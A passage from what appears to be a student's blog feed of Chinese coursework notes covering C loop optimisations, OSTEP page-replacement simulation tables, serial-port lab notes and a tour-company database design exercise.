class="line"></span><br><span class="line">    <span class="comment">// 接下来，以字（word）为单位来进行填充</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *word_ptr = (<span class="type">unsigned</span> <span class="type">long</span> *)byte_ptr;</span><br><span class="line">    <span class="keyword">while</span> (n &gt;= k) &#123;</span><br><span class="line">        *word_ptr++ = word_value;</span><br><span class="line">        n -= k;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理剩余的字节</span></span><br><span class="line">    byte_ptr = (<span class="type">unsigned</span> <span class="type">char</span> *)word_ptr;</span><br><span class="line">    <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        *byte_ptr++ = value;</span><br><span class="line">        --n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-21"><a href="#5-21" class="headerlink" title="5.21"></a>5.21</h3><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514162241240-171567496378812.png" alt="image-20240514162241240"></p><p><img src="/../images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%BD%9C%E4%B8%9A%E4%B8%89/image-20240514162253699-171567497464713.png" alt="image-20240514162253699"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//psum1</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">psum1</span> <span class="params">(<span class="type">float</span> a[] , <span class="type">float</span> p [] , <span class="type">long</span> <span class="type">int</span> n)</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="type">long</span> <span class="type">int</span> i; </span><br><span class="line">p[O] = a[O]; </span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++) </span><br><span class="line">p[i] = p[i<span class="number">-1</span>] + a[i]; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>优化后的版本如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">psum1</span><span class="params">(<span class="type">float</span> a[], <span class="type">float</span> p[], <span class="type">long</span> <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> i;</span><br><span class="line">  <span class="type">float</span> val;</span><br><span class="line">  <span class="type">float</span> tmp1,tmp2,tmp3,tmp4;</span><br><span class="line">    val = p[<span class="number">0</span>] = a[<span class="number">0</span>]; </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n - <span class="number">4</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">      tmp1 = val + a[i];</span><br><span class="line">      tmp2 = tmp1 + a[i+<span class="number">1</span>];</span><br><span class="line">      tmp3 = tmp2 + a[i+<span class="number">2</span>];</span><br><span class="line">      tmp4 = tmp3 + a[i+<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">      p[i] = tmp1;</span><br><span class="line">      p[i+<span class="number">1</span>] = tmp2;</span><br><span class="line">      p[i+<span class="number">2</span>] = tmp3;</span><br><span class="line">      p[i+<span class="number">3</span>] = tmp4;</span><br><span class="line"></span><br><span class="line">      val = val + (a[i] + a[i+<span class="number">1</span>] + a[i+<span class="number">2</span>] + a[i+<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">for</span>(;i&lt;n;i++)&#123;</span><br><span class="line">       val += a[i];</span><br><span class="line">       p[i] = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;第六章&quot;&gt;&lt;a href=&quot;#第六章&quot; class=&quot;headerlink&quot; title=&quot;第六章&quot;&gt;&lt;/a&gt;第六章&lt;/h2&gt;&lt;h3 id=&quot;6-30&quot;&gt;&lt;a href=&quot;#6-30&quot; class=&quot;headerlink&quot; title=&quot;6.30&quot;&gt;&lt;/a&gt;6.3</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>操作系统作业第二十章</title>
    <link href="https://ycx6666.github.io/2024/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/"/>
    <id>https://ycx6666.github.io/2024/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/</id>
    <published>2024-05-01T13:44:57.000Z</published>
    <updated>2024-05-18T07:41:43.324Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/e01d016422604c679a6d632a5b77b830-17146367012702.png" alt="在这里插入图片描述"></p><h2 id="1-FIFO"><a href="#1-FIFO" class="headerlink" title="1.FIFO"></a>1.FIFO</h2><h4 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h4><p>运行<code>./paging-multilevel-translate.py -s 0 -n 10</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502160208439-17146369300283.png" alt="image-20240502160208439"></p><table><thead><tr><th>访问进程</th><th>命中状态</th><th>被替换进程</th><th>缓存</th></tr></thead><tbody><tr><td>8</td><td>未命中</td><td></td><td>8</td></tr><tr><td>7</td><td>未命中</td><td></td><td>8,7</td></tr><tr><td>4</td><td>未命中</td><td></td><td>8，7，4</td></tr><tr><td>2</td><td>未命中</td><td>8</td><td>7，4，2</td></tr><tr><td>5</td><td>未命中</td><td>7</td><td>4，2，5</td></tr><tr><td>4</td><td>命中</td><td></td><td>4，2，5</td></tr><tr><td>7</td><td>未命中</td><td>4</td><td>2，5，7</td></tr><tr><td>3</td><td>未命中</td><td>2</td><td>5，7，3</td></tr><tr><td>4</td><td>未命中</td><td>5</td><td>7，3，4</td></tr><tr><td>5</td><td>未命中</td><td>7</td><td>3，4，5</td></tr></tbody></table><p>运行<code>./paging-multilevel-translate.py -s 0 -n 10 -c</code>验证答案</p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502160759694-17146372811564.png" alt="image-20240502160759694"></p><h4 id="二、"><a href="#二、" class="headerlink" title="二、"></a><strong>二、</strong></h4><p>运行<code>./paging-multilevel-translate.py -s 1 -n 10</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502161020716-17146374231765.png" alt="image-20240502161020716"></p><table><thead><tr><th>访问进程</th><th>命中状态</th><th>被替换进程</th><th>缓存</th></tr></thead><tbody><tr><td>1</td><td>未命中</td><td></td><td>1</td></tr><tr><td>8</td><td>未命中</td><td></td><td>1,8</td></tr><tr><td>7</td><td>未命中</td><td></td><td>1,8,7</td></tr><tr><td>2</td><td>未命中</td><td>1</td><td>8,7,2</td></tr><tr><td>4</td><td>未命中</td><td>8</td><td>7,2,4</td></tr><tr><td>4</td><td>命中</td><td></td><td>7,2,4</td></tr><tr><td>6</td><td>未命中</td><td>7</td><td>2,4,6</td></tr><tr><td>7</td><td>未命中</td><td>2</td><td>4,6,7</td></tr><tr><td>0</td><td>未命中</td><td>4</td><td>6,7,0</td></tr><tr><td>0</td><td>命中</td><td></td><td>6,7,0</td></tr></tbody></table><p>运行<code>./paging-multilevel-translate.py -s 1 -n 10 -c</code>验证答案</p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502161256694-17146375775846.png" alt="image-20240502161256694"></p><h4 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h4><p>运行<code>./paging-multilevel-translate.py -s 2 -n 10</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502161344877-17146376260397.png" alt="image-20240502161344877"></p><table><thead><tr><th>访问进程</th><th>命中状态</th><th>被替换进程</th><th>缓存</th></tr></thead><tbody><tr><td>9</td><td>未命中</td><td></td><td>9</td></tr><tr><td>9</td><td>命中</td><td></td><td>9</td></tr><tr><td>0</td><td>未命中</td><td></td><td>9,0</td></tr><tr><td>0</td><td>命中</td><td></td><td>9,0</td></tr><tr><td>8</td><td>未命中</td><td></td><td>9,0,8</td></tr><tr><td>7</td><td>未命中</td><td>9</td><td>0,8,7</td></tr><tr><td>6</td><td>未命中</td><td>0</td><td>8,7,6</td></tr><tr><td>3</td><td>未命中</td><td>8</td><td>7,6,3</td></tr><tr><td>6</td><td>命中</td><td></td><td>7,6,3</td></tr><tr><td>6</td><td>命中</td><td></td><td>7,6,3</td></tr></tbody></table><p>运行<code>./paging-multilevel-translate.py -s 2 -n 10 -c</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502161644825-17146378062048.png" alt="image-20240502161644825"></p><h2 id="2-LRU"><a href="#2-LRU" class="headerlink" title="2.LRU"></a>2.LRU</h2><h4 id="一、-1"><a href="#一、-1" class="headerlink" title="一、"></a>一、</h4><p>运行<code>./paging-policy.py -s 0 -n 10 -p LRU</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502162306615-17146381876979.png" alt="image-20240502162306615"></p><table><thead><tr><th>访问进程</th><th>命中状态</th><th>被替换进程</th><th>缓存</th></tr></thead><tbody><tr><td>8</td><td>未命中</td><td></td><td>8</td></tr><tr><td>7</td><td>未命中</td><td></td><td>8,7</td></tr><tr><td>4</td><td>未命中</td><td></td><td>8,7,4</td></tr><tr><td>2</td><td>命中</td><td>8</td><td>7,4,2</td></tr><tr><td>5</td><td>未命中</td><td>7</td><td>4,2,5</td></tr><tr><td>4</td><td>命中</td><td></td><td>4,2,5</td></tr><tr><td>7</td><td>未命中</td><td>2</td><td>4,5,7</td></tr><tr><td>3</td><td>未命中</td><td>5</td><td>4,7,3</td></tr><tr><td>4</td><td>命中</td><td></td><td>4,7,3</td></tr><tr><td>5</td><td>未命中</td><td>7</td><td>4,3,5</td></tr></tbody></table><p>运行<code>./paging-policy.py -s 0 -n 10 -p LRU -c</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502162715681-171463843656110.png" alt="image-20240502162715681"></p><h4 id="二、-1"><a href="#二、-1" class="headerlink" title="二、"></a>二、</h4><p>运行<code>./paging-policy.py -s 1 -n 10 -p LRU</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502162755700-171463847712111.png" alt="image-20240502162755700"></p><table><thead><tr><th>访问进程</th><th>命中状态</th><th>被替换进程</th><th>缓存</th></tr></thead><tbody><tr><td>1</td><td>未命中</td><td></td><td>1</td></tr><tr><td>8</td><td>未命中</td><td></td><td>1，8</td></tr><tr><td>7</td><td>未命中</td><td></td><td>1，8，7</td></tr><tr><td>2</td><td>未命中</td><td>1</td><td>8，7，2</td></tr><tr><td>4</td><td>未命中</td><td>8</td><td>7，2，4</td></tr><tr><td>4</td><td>命中</td><td></td><td>7，2，4</td></tr><tr><td>6</td><td>未命中</td><td>7</td><td>2，4，6</td></tr><tr><td>7</td><td>未命中</td><td>2</td><td>4，6，7</td></tr><tr><td>0</td><td>未命中</td><td>4</td><td>6，7，0</td></tr><tr><td>0</td><td>命中</td><td></td><td>6，7，0</td></tr></tbody></table><p>运行<code>./paging-policy.py -s 1 -n 10 -p LRU -c</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502163138579-171463869996212.png" alt="image-20240502163138579"></p><h4 id="三、-1"><a href="#三、-1" class="headerlink" title="三、"></a>三、</h4><p>运行<code>./paging-policy.py -s 2 -n 10 -p LRU</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502163207919-171463872935813.png" alt="image-20240502163207919"></p><table><thead><tr><th>访问进程</th><th>命中状态</th><th>被替换进程</th><th>缓存</th></tr></thead><tbody><tr><td>9</td><td>未命中</td><td></td><td>9</td></tr><tr><td>9</td><td>命中</td><td></td><td>9</td></tr><tr><td>0</td><td>未命中</td><td></td><td>9，0</td></tr><tr><td>0</td><td>命中</td><td></td><td>9，0</td></tr><tr><td>8</td><td>未命中</td><td></td><td>9，0，8</td></tr><tr><td>7</td><td>未命中</td><td>9</td><td>0，8，7</td></tr><tr><td>6</td><td>未命中</td><td>0</td><td>8，7，6</td></tr><tr><td>3</td><td>未命中</td><td>8</td><td>7，6，3</td></tr><tr><td>6</td><td>命中</td><td></td><td>7，3，6</td></tr><tr><td>6</td><td>命中</td><td></td><td>7，3，6</td></tr></tbody></table><p>运行<code>./paging-policy.py -s 2 -n 10 -p LRU -c</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502163405192-171463884667414.png" alt="image-20240502163405192"></p><h2 id="3-OPT"><a href="#3-OPT" class="headerlink" title="3.OPT"></a>3.OPT</h2><h4 id="一、-2"><a href="#一、-2" class="headerlink" title="一、"></a>一、</h4><p>运行<code>./paging-policy.py -s 0 -n 10 -p OPT</code> </p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502163520158-171463892140715.png" alt="image-20240502163520158"></p><table><thead><tr><th>访问进程</th><th>命中状态</th><th>被替换进程</th><th>缓存</th></tr></thead><tbody><tr><td>8</td><td>未命中</td><td></td><td>8</td></tr><tr><td>7</td><td>未命中</td><td></td><td>8，7</td></tr><tr><td>4</td><td>未命中</td><td></td><td>8，7，4</td></tr><tr><td>2</td><td>未命中</td><td>8</td><td>7，4，2</td></tr><tr><td>5</td><td>未命中</td><td>2</td><td>4，7，5</td></tr><tr><td>4</td><td>命中</td><td></td><td>7，4，5</td></tr><tr><td>7</td><td>命中</td><td></td><td>4，5，7</td></tr><tr><td>3</td><td>未命中</td><td>7</td><td>4，5，3</td></tr><tr><td>4</td><td>命中</td><td></td><td>4，5，3</td></tr><tr><td>5</td><td>命中</td><td></td><td>4，5，3</td></tr></tbody></table><p>运行<code>./paging-policy.py -s 0 -n 10 -p OPT -c</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502163852226-171463913366616.png" alt="image-20240502163852226"></p><h4 id="二、-2"><a href="#二、-2" class="headerlink" title="二、"></a>二、</h4><p>运行<code>./paging-policy.py -s 1 -n 10 -p OPT</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502163954421-171463919558217.png" alt="image-20240502163954421"></p><table><thead><tr><th>访问进程</th><th>命中状态</th><th>被替换进程</th><th>缓存</th></tr></thead><tbody><tr><td>1</td><td>未命中</td><td></td><td>1</td></tr><tr><td>8</td><td>未命中</td><td></td><td>1，8</td></tr><tr><td>7</td><td>未命中</td><td></td><td>1，8，7</td></tr><tr><td>2</td><td>未命中</td><td>8</td><td>1，7，2</td></tr><tr><td>4</td><td>未命中</td><td>2</td><td>1，7，4</td></tr><tr><td>4</td><td>命中</td><td></td><td>1，7，4</td></tr><tr><td>6</td><td>未命中</td><td>4</td><td>1，7，6</td></tr><tr><td>7</td><td>命中</td><td></td><td>1，7，6</td></tr><tr><td>0</td><td>未命中</td><td>6</td><td>1，7，0</td></tr><tr><td>0</td><td>命中</td><td></td><td>1，7，0</td></tr></tbody></table><p>运行<code>./paging-policy.py -s 1 -n 10 -p OPT -c</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502164434417-171463947611418.png" alt="image-20240502164434417"></p><h4 id="三、-2"><a href="#三、-2" class="headerlink" title="三、"></a>三、</h4><p>运行<code>./paging-policy.py -s 2 -n 10 -p OPT</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502164648752-171463961019019.png" alt="image-20240502164648752"></p><table><thead><tr><th>访问进程</th><th>命中状态</th><th>被替换进程</th><th>缓存</th></tr></thead><tbody><tr><td>9</td><td>未命中</td><td></td><td>9</td></tr><tr><td>9</td><td>命中</td><td></td><td>9</td></tr><tr><td>0</td><td>未命中</td><td></td><td>9，0</td></tr><tr><td>0</td><td>命中</td><td></td><td>9，0</td></tr><tr><td>8</td><td>未命中</td><td></td><td>9，0，8</td></tr><tr><td>7</td><td>未命中</td><td>8</td><td>9，0，7</td></tr><tr><td>6</td><td>未命中</td><td>7</td><td>9，0，6</td></tr><tr><td>3</td><td>未命中</td><td>0</td><td>9，6，3</td></tr><tr><td>6</td><td>命中</td><td></td><td>9，6，3</td></tr><tr><td>6</td><td>命中</td><td></td><td>9，6，3</td></tr></tbody></table><p>运行<code>./paging-policy.py -s 2 -n 10 -p OPT -c</code></p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/image-20240502164859072-171463974072120.png" alt="image-20240502164859072"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0/e01d016422604c679a6d632a5b77b830-1714636701</summary>
      
    
    
    
    <category term="作业" scheme="https://ycx6666.github.io/categories/%E4%BD%9C%E4%B8%9A/"/>
    
    
    <category term="操作系统" scheme="https://ycx6666.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://ycx6666.github.io/2024/04/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B02-2/"/>
    <id>https://ycx6666.github.io/2024/04/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B02-2/</id>
    <published>2024-04-28T05:04:49.638Z</published>
    <updated>2024-05-16T06:07:36.589Z</updated>
    
    <content type="html"><![CDATA[<p>41600</p><p>–38400kjlghkljoipioip-97</p><p><img src="/../images/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B02-2/image-20240428131116525.png" alt="image-20240428131116525"></p><p><img src="/../images/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B02-2/90fd5822089b766c6096ff6a392042b1.png" alt="img"></p><p>curl “132.232.98.70:6363&#x2F;checkBaud?id&#x3D;202226010418&amp;v&#x3D;a01d551e75642c687a79be”</p><p><img src="/../images/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B02-2/image-20240428134053929.png" alt="image-20240428134053929"></p><h2 id="2-3"><a href="#2-3" class="headerlink" title="2-3"></a>2-3</h2><p>序列号:AA 55 A0 1D D0 33 1A 5A 73 4F F7 5B 40</p><p>发送学号后：AA 55 07 FF FF FF A5 83 8D 90 </p><p>密码：AA 55 A5 83 8D 90 </p><p>第二次：AA 55 A5 83 8D 90</p><p><img src="/../images/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B02-2/image-20240509152936289-17152397856633.png" alt="image-20240509152936289"><img src="/../images/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B02-2/IMG_20240509_140119-17152397699102.jpg" alt="IMG_20240509_140119"><img src="/../images/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B02-2/image-20240509130815594-17152312966361.png" alt="image-20240509130815594"></p><h2 id="2-3-1"><a href="#2-3-1" class="headerlink" title="2-3"></a>2-3</h2><ol><li></li></ol><p>yl学号 : <code>AA 55 02 00 02 02 02 06 00 01 00 04 01 06</code> 密码: AA 55 88 63 70 1F </p><p>dty学号 : <code>AA 55 02 00 02 02 02 06 00 01 00 04 01 08</code></p><p>波特率：57600</p><p><img src="/../images/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B02-2/image-20240516134752897-17158384738981.png" alt="image-20240516134752897"></p><ol start="2"><li></li></ol><p>波特率:</p><p><img src="/../images/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B02-2/image-20240516140541637-17158395426702.png" alt="image-20240516140541637"></p><p>序列号:AA 55 7D 20 48 C3</p><p>密码:AA 55 2A B8 E2 D8</p><p><img src="/../images/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B02-2/image-20240516140733452-17158396554373.png" alt="image-20240516140733452"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;41600&lt;/p&gt;
&lt;p&gt;–38400kjlghkljoipioip-97&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/../images/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B02-2/image-2024042</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://ycx6666.github.io/2024/04/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B01/"/>
    <id>https://ycx6666.github.io/2024/04/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B01/</id>
    <published>2024-04-25T10:58:00.380Z</published>
    <updated>2024-04-25T11:46:22.127Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2024/04/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B01/Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20240425190733085.png" alt="image-20240425190733085"></p><p><img src="/2024/04/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B01/Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20240425190911202.png" alt="image-20240425190911202"></p><p><img src="/2024/04/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B01/Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20240425191339074.png" alt="image-20240425191339074"></p><p><img src="/2024/04/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B01/Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20240425192630676.png" alt="image-20240425192630676"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2024/04/%E7%94%B5%E5%AD%90%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B01/Users&#92;南渡的南&#92;AppData&#92;Roaming&#92;Typora&#92;typora-user-images&#92;image-202</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://ycx6666.github.io/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC%E5%85%AB%E7%AB%A0(%E8%A1%A5%E5%85%85)/"/>
    <id>https://ycx6666.github.io/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%AC%E5%85%AB%E7%AB%A0(%E8%A1%A5%E5%85%85)/</id>
    <published>2024-04-23T14:11:56.736Z</published>
    <updated>2024-04-23T14:12:30.775Z</updated>
    
    <content type="html"><![CDATA[<ol start="5"><li>Student ( <strong>student_id</strong>, name, class_id, subject_id )</li></ol><ul><li>主键: student_id</li><li>外键: class_id 引用 Class(class_id)</li><li>外键: subject_id 引用 Training Subject(subject_id)</li></ul><ol start="6"><li>Attendance ( <strong>attendance_id</strong>, date, trainer_id )</li></ol><ul><li>主键: attendance_id</li></ul><p><strong>3)</strong></p><p>都满足；</p><p><strong>4)</strong></p><ol><li>调度员对未交费客户的工单调度限制：只有当客户完成支付后，才能被安排到工单中。这个规则保证了公司资金的流动和服务提供的前提条件。</li><li>旅游车的状态更新和调度：旅游车的状态（维修、待命、派出）关系到调度的可行性和调度员的工作效率。任何状态的变化都需要及时更新，确保所有调度在车辆可用的情况下进行。</li></ol><h2 id="8-6"><a href="#8-6" class="headerlink" title="8-6"></a>8-6</h2><p>旅游公司开辟了一些旅游线路，对外承接旅游接待业务。旅游线路包括线路名称、游玩路线出发时间、游玩时长、价格。对于一条旅游线路，一天中有多个出发时间。客户预订时，要填写姓名、身份证号、联系电话、微信号、email、旅游日期、选择的旅游线路、出发时间、人数。公司有一些旅游车，有一些司机、导游、调度员。公司员工都有工号、姓名、电话、月工资。旅游车有车牌号、座位数、车辆状态。车辆状态有“维修”“待命”“派出”三种。调度员每天安排游览时，根据游客预订情况以及车辆状态来进行调度安排。每车安排一个司机、一个导游、以工单进行调度。工单包括工单号、车牌号、线路名称、出发时间、司机、导游、游客。工单一旦排出，就马上短信通知游客、司机、导游。调度员派工单时，只安排交了费的游客，对没有交费的游客，则短信提醒交费。游客以微信方式交费。一旦交费，便会收到短信提示，包括交费方的微信号、交费额。请设计一个数据库来支持公司的业务开展，尽量实现业务处理的自动化。另外，公司为了拉动业务，奖励老游客介绍新游客。游客预定时，可填上介绍人的微信号。</p><p>1)设计旅游经营业务的ER图。</p><p>2)将所设计的ER图转化为关系模式，指明每个关系的主键，有外键的指明外键。</p><p>3)对照范式检查，看每个关系是否满足所有范式?如果不满足，则设法使之满足。</p><p>4)凭常识说出此业务的两个业务规则约束。</p><p><strong>1)</strong></p><p><img src="https://sf-bot-studio-plugin-resource.coze.com/obj/bot-studio-platform-plugin-sg/plantuml/a3c2b075-3179-4a78-b54d-64e8713745dd.png" alt="旅游经营业务ER图"></p><p><strong>2)</strong></p><ol><li>TourRoute ( route_name, departure_times, duration, price )<ul><li>主键: route_name</li></ul></li><li>Customer ( customer_id, name, identity_number, phone_number, wechat_id, email, tour_date, selected_route_name, selected_departure_time, number_of_people, referrer_wechat_id )<ul><li>主键: customer_id</li><li>外键: selected_route_name 引用 TourRoute.route_name</li></ul></li><li>Vehicle ( license_plate, seats, status )<ul><li>主键: license_plate</li></ul></li><li>Employee ( employee_id, name, phone_number, position, monthly_salary )<ul><li>主键: employee_id</li></ul></li><li>JobOrder ( order_id, license_plate, route_name, departure_time, driver_id, guide_id, customer_id )<ul><li>主键: order_id</li><li>外键: license_plate 引用 Vehicle.license_plate</li><li>外键: route_name 引用 TourRoute.route_name</li><li>外键: driver_id 引用 Employee.employee_id (司机)</li><li>外键: guide_id 引用 Employee.employee_id (导游)</li><li>外键: customer_id 引用 Customer.customer_id</li></ul></li><li>Payment ( payment_id, customer_id, amount, wechat_id )<ul><li>主键: payment_id</li><li>外键: customer_id 引用 Customer.customer_id</li></ul></li></ol><p><strong>3)</strong></p><p>都满足；</p><p><strong>4)</strong></p><ol><li>关于车辆调度的规则：每辆旅游车在同一时间只能被分配给一个旅游团，且车辆必须处于“待命”状态才能被分配。</li><li>关于付款的规则：游客必须在出发前完成支付，支付信息需要与游客的预订信息匹配，完成支付后游客、司机、导游将收到包含出发时间和地点的短信通知。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol start=&quot;5&quot;&gt;
&lt;li&gt;Student ( &lt;strong&gt;student_id&lt;/strong&gt;, name, class_id, subject_id )&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;主键: student_id&lt;/li&gt;
&lt;li&gt;外键: class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>数据库作业第八章</title>
    <link href="https://ycx6666.github.io/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%9C%E4%B8%9A%E7%AC%AC%E5%85%AB%E7%AB%A0/"/>
